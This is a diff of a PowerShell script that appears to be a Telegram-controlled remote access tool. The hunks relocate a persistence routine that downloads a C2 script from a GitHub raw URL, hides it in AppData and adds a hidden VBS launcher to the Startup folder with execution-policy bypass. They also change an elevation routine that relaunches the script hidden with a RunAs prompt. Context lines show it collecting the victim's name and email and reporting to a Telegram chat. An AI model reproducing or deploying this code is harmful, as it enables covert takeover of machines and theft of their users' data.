@@ -263,35 +263,6 @@ Start-Sleep -Milliseconds 10
 }
 }
 
-
-Function Persistance{
-$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
-$scriptContent | Out-File -FilePath $newScriptPath -force
-sleep 1
-if ($newScriptPath.Length -lt 100){
-    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-    i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
-    sleep 1
-    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
-    }
-$tobat = @'
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
-'@
-$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-$tobat | Out-File -FilePath $pth -Force
-Write-Output "Persistance Added."
-rm -path "$env:TEMP\temp.ps1" -Force
-}
-
-
-Function RemovePersistance{
-rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-rm -Path "$env:APPDATA\Microsoft\Windows\copy.ps1"
-Write-Output "Uninstalled."
-}
-
 Function SystemInfo{
 $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
 $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
@@ -463,6 +434,35 @@ rm -Path $zipFilePath -Force
 Write-Output "Done."
 }
 
+
+Function Persistance{
+$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+$scriptContent | Out-File -FilePath $newScriptPath -force
+sleep 1
+if ($newScriptPath.Length -lt 100){
+    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
+    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
+    i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
+    sleep 1
+    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+    }
+$tobat = @'
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
+'@
+$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+$tobat | Out-File -FilePath $pth -Force
+Write-Output "Persistance Added."
+rm -path "$env:TEMP\temp.ps1" -Force
+}
+
+
+Function RemovePersistance{
+rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+rm -Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+Write-Output "Uninstalled."
+}
+
 Function PauseSession{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
@@ -502,6 +502,7 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 
 
 Function AttemptElevate{
+Write-Output "Prompt Sent to User.."
 if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
     $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
     $scriptContent | Out-File -FilePath $newScriptPath -force
@@ -511,14 +512,8 @@ if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
         i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
         Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
         }
-$tobat = @'
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
-'@
-    $pth = "$env:APPDATA\Microsoft\Windows\temp.vbs"
-    $tobat | Out-File -FilePath $pth -Force
-    sleep 2
-    Start-Process -FilePath $pth -Verb RunAs
+    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"%APPDATA%\Microsoft\Windows\temp.ps1`"") -Verb RunAs
+    Sleep 10
     rm -path "$env:TEMP\temp.ps1" -Force
     }
 }
@@ -529,7 +524,7 @@ Function IsAuth{
 param($CheckMessage)
     if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
         $script:AcceptedSession="Authenticated"
-        $contents = "$comp $env:COMPUTERNAME $tick Session Starting.."
+        $contents = "$comp $env:COMPUTERNAME $tick Session Starting..."
         $params = @{chat_id = $ChatID ;text = $contents}
         Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
         ShowButtons
@@ -588,4 +583,3 @@ $messages=rtgmsg
         }
     }
 }
-
